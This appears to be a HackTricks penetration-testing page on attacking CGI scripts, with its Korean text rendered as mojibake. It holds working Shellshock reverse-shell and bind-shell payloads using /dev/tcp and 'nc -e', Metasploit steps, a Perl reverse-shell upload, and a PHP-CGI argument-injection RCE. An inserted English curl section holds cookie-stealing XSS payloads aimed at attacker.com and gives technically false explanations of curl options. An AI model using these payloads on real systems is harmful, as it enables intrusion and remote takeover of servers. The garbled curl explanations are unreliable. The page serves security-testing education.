<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


# ì •ë³´

**CGI ìŠ¤í¬ë¦½íŠ¸ëŠ” perl ìŠ¤í¬ë¦½íŠ¸**ì´ë¯€ë¡œ, **.cgi** ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì„œë²„ë¥¼ ì¹¨íˆ¬í–ˆë‹¤ë©´, perl ì—­ì‰˜ì´ ìˆëŠ” **/usr/share/webshells/perl/perl-reverse-shell.pl**ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **.pl** í™•ì¥ìë¥¼ **.cgi**ë¡œ ë³€ê²½í•˜ê³ , **ì‹¤í–‰ ê¶Œí•œ**ì„ ë¶€ì—¬í•œ ë‹¤ìŒ, ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì—­ì‰˜ì— **ì ‘ê·¼**í•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
**CGI ì·¨ì•½ì **ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ `nikto -C all` \(ë° ëª¨ë“  í”ŒëŸ¬ê·¸ì¸\)ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

# **ShellShock**

**ShellShock**ëŠ” ìœ ë‹‰ìŠ¤ ê¸°ë°˜ ìš´ì˜ ì²´ì œì—ì„œ ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” **Bash** ëª…ë ¹ ì¤„ ì…¸ì— ì˜í–¥ì„ ì£¼ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ Bashê°€ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ì „ë‹¬ëœ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ëŠ¥ë ¥ì„ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤. ì·¨ì•½ì ì€ í”„ë¡œì„¸ìŠ¤ê°€ ì»´í“¨í„°ì—ì„œ ì‹¤í–‰ë˜ëŠ” ë°©ì‹ì— ì˜í–¥ì„ ì£¼ëŠ” ë™ì ìœ¼ë¡œ ëª…ëª…ëœ ê°’ì¸ **í™˜ê²½ ë³€ìˆ˜**ì˜ ì¡°ì‘ì— ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” í™˜ê²½ ë³€ìˆ˜ì— **ì•…ì„± ì½”ë“œ**ë¥¼ ì²¨ë¶€í•˜ì—¬ ë³€ìˆ˜ë¥¼ ìˆ˜ì‹ í•˜ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì‹œìŠ¤í…œì„ ì ì¬ì ìœ¼ë¡œ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ **í˜ì´ì§€ì—ì„œ ì˜¤ë¥˜ê°€ ë°œìƒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ **ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì˜¤ë˜ëœ Apache ë²„ì „ì„ ì‚¬ìš©í•˜ê±°ë‚˜ cgi\_mod \(cgi í´ë” í¬í•¨\)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ niktoë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì•Œì•„ì°¨ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## **í…ŒìŠ¤íŠ¸**

ëŒ€ë¶€ë¶„ì˜ í…ŒìŠ¤íŠ¸ëŠ” ì–´ë–¤ ê²ƒì„ echoí•˜ê³  ê·¸ ë¬¸ìì—´ì´ ì›¹ ì‘ë‹µì—ì„œ ë°˜í™˜ë˜ëŠ”ì§€ ê¸°ëŒ€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. í˜ì´ì§€ê°€ ì·¨ì•½í•  ìˆ˜ ìˆë‹¤ê³  ìƒê°ë˜ë©´ ëª¨ë“  cgi í˜ì´ì§€ë¥¼ ê²€ìƒ‰í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(ë°˜ì‚¬, ë¸”ë¼ì¸ë“œ ë° ì™¸ë¶€ë°´ë“œ\)**

Curl is a command-line tool used for making HTTP requests. It can be used to test and exploit various vulnerabilities in web applications. In this section, we will discuss three types of Curl-based attacks: reflected, blind, and out-of-band attacks.

### **Reflected Attacks**

Reflected attacks involve injecting malicious code into user input that is then reflected back in the server's response. This type of attack is commonly found in web applications that do not properly sanitize user input.

To perform a reflected attack using Curl, you can use the `-d` or `--data` option to send the payload as part of the HTTP request. For example:

```bash
curl -d "payload=<script>alert('XSS')</script>" http://example.com/page
```

In this example, the payload is a JavaScript code that will be executed when the server reflects it back in the response. This can be used to perform cross-site scripting (XSS) attacks.

### **Blind Attacks**

Blind attacks are similar to reflected attacks, but the server does not directly reflect the injected code in its response. Instead, the attacker needs to find a way to extract the response indirectly.

To perform a blind attack using Curl, you can use the `-o` or `--output` option to save the response to a file. For example:

```bash
curl -o response.txt http://example.com/page?payload=<script>document.location='http://attacker.com/?cookie='+document.cookie</script>
```

In this example, the payload is a JavaScript code that redirects the user to the attacker's website and includes their cookie information in the URL. By checking the contents of the `response.txt` file, the attacker can extract the user's cookie.

### **Out-of-Band Attacks**

Out-of-band attacks involve sending data from the target server to an external server controlled by the attacker. This can be useful when the attacker cannot directly access the server's response.

To perform an out-of-band attack using Curl, you can use the `--dns` option to make DNS requests to the attacker's server. For example:

```bash
curl --dns-ipv4-addr=attacker.com http://example.com/page?payload=<img src=x onerror=this.src='http://attacker.com/?data='+document.cookie>
```

In this example, the payload is an HTML image tag that triggers an error and sends the user's cookie data to the attacker's server. By monitoring the DNS requests made to `attacker.com`, the attacker can extract the user's cookie.

These are just a few examples of how Curl can be used to perform reflected, blind, and out-of-band attacks. It is important to note that these attacks should only be performed on systems that you have permission to test.
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)ì€ Shellshock ì·¨ì•½ì ì„ ì´ìš©í•œ ì›¹ ì„œë²„ ì·¨ì•½ì  ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. ShellshockëŠ” ì›¹ ì„œë²„ì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì ìœ¼ë¡œ, ì›ê²©ì—ì„œ ì•…ì˜ì ì¸ ì½”ë“œ ì‹¤í–‰ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ShellsockerëŠ” ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ìë™ìœ¼ë¡œ íƒì§€í•˜ê³  ìŠ¤ìº”í•˜ì—¬ ì›¹ ì„œë²„ì˜ ë³´ì•ˆì„ ê°•í™”í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## Exploit (ì•…ìš©)

Once you have identified a CGI script on a web server, the next step is to exploit it. Exploiting a CGI script involves finding vulnerabilities or weaknesses in the script that can be leveraged to gain unauthorized access or perform malicious actions.

### Common CGI Exploits (ì¼ë°˜ì ì¸ CGI ì•…ìš©)

1. Command Injection (ëª…ë ¹ ì£¼ì…): This exploit occurs when an attacker is able to inject malicious commands into the CGI script, which are then executed by the server. This can allow the attacker to execute arbitrary commands on the server and potentially gain full control.

2. File Inclusion (íŒŒì¼ í¬í•¨): This exploit occurs when an attacker is able to include arbitrary files in the CGI script, which can lead to the disclosure of sensitive information or the execution of malicious code.

3. Path Traversal (ê²½ë¡œ íƒìƒ‰): This exploit occurs when an attacker is able to manipulate the file path used by the CGI script, allowing them to access files outside of the intended directory. This can lead to the disclosure of sensitive information or the execution of arbitrary code.

4. Remote Code Execution (ì›ê²© ì½”ë“œ ì‹¤í–‰): This exploit occurs when an attacker is able to execute arbitrary code on the server by exploiting a vulnerability in the CGI script. This can allow the attacker to gain full control over the server.

### Exploit Tools (ì•…ìš© ë„êµ¬)

There are several tools available that can assist in exploiting CGI scripts. Some popular ones include:

- **Metasploit Framework**: A powerful framework that provides a wide range of exploits, including those targeting CGI scripts.

- **Nikto**: A web server scanner that can identify vulnerabilities in CGI scripts and provide potential exploits.

- **ExploitDB**: A comprehensive database of exploits that can be used to search for specific vulnerabilities in CGI scripts.

### Manual Exploitation (ìˆ˜ë™ ì•…ìš©)

In addition to using automated tools, manual exploitation can also be performed by analyzing the CGI script and identifying potential vulnerabilities. This can involve examining the script's source code, input validation, and error handling mechanisms.

Once a vulnerability is identified, the attacker can craft a payload or exploit code to take advantage of the vulnerability and gain unauthorized access or perform malicious actions.

### Countermeasures (ëŒ€ì‘ì±…)

To protect against CGI exploits, it is important to implement the following countermeasures:

- **Input Validation**: Ensure that all user input is properly validated and sanitized to prevent command injection, file inclusion, and path traversal attacks.

- **Secure Configuration**: Configure the web server and CGI scripts to run with the least privileges necessary and disable unnecessary features or functionality.

- **Regular Updates**: Keep the web server and CGI scripts up to date with the latest security patches and updates to mitigate known vulnerabilities.

- **Web Application Firewall (WAF)**: Implement a WAF to monitor and filter incoming requests to the web server, blocking known CGI exploits.

By implementing these countermeasures, the risk of CGI exploits can be significantly reduced, helping to protect the web server and the sensitive data it contains.
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **í”„ë¡ì‹œ (MitMì„ í†µí•œ ì›¹ ì„œë²„ ìš”ì²­)**

CGIëŠ” HTTP ìš”ì²­ì˜ ê° í—¤ë”ì— ëŒ€í•´ í™˜ê²½ ë³€ìˆ˜ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: "host:web.com"ì€ "HTTP\_HOST"="web.com"ìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤.

HTTP\_PROXY ë³€ìˆ˜ëŠ” ì›¹ ì„œë²„ì—ì„œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. "**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**"ë¼ëŠ” **í—¤ë”**ë¥¼ ë³´ë‚´ë³´ê³ , ì„œë²„ê°€ ì„¸ì…˜ ë™ì•ˆ ì–´ë–¤ ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ”ì§€ í™•ì¸í•´ë³´ì„¸ìš”. ê·¸ëŸ¬ë©´ ì„œë²„ê°€ ìˆ˜í–‰í•œ ê° ìš”ì²­ì„ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

# ì˜¤ë˜ëœ PHP + CGI = RCE (CVE-2012-1823, CVE-2012-2311)

ê¸°ë³¸ì ìœ¼ë¡œ cgiê°€ í™œì„±í™”ë˜ì–´ ìˆê³  phpê°€ "ì˜¤ë˜ëœ" ê²½ìš° \(&lt;5.3.12 / &lt; 5.4.2\), ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë ¤ë©´, íŒŒë¼ë¯¸í„°ë¥¼ ë³´ë‚´ì§€ ì•Šê³  ì›¹ ì„œë²„ì˜ ì–´ë–¤ PHP íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•©ë‹ˆë‹¤ (íŠ¹íˆ "=" ë¬¸ìë¥¼ ë³´ë‚´ì§€ ì•Šê³ ).
ê·¸ëŸ° ë‹¤ìŒ, ì´ ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ `/index.php?-s` (ì£¼ì˜: `-s`)ì™€ ê°™ì´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë©°, ì‘ë‹µì—ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì˜ **ì†ŒìŠ¤ ì½”ë“œ**ê°€ í‘œì‹œë©ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, **RCE**ë¥¼ ì–»ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ íŠ¹ìˆ˜ ì¿¼ë¦¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` ê·¸ë¦¬ê³  **ìš”ì²­ ë³¸ë¬¸ì— ì‹¤í–‰í•  PHP ì½”ë“œë¥¼ í¬í•¨**í•©ë‹ˆë‹¤.
ì˜ˆì‹œ:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**ì·¨ì•½ì ê³¼ ê°€ëŠ¥í•œ ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
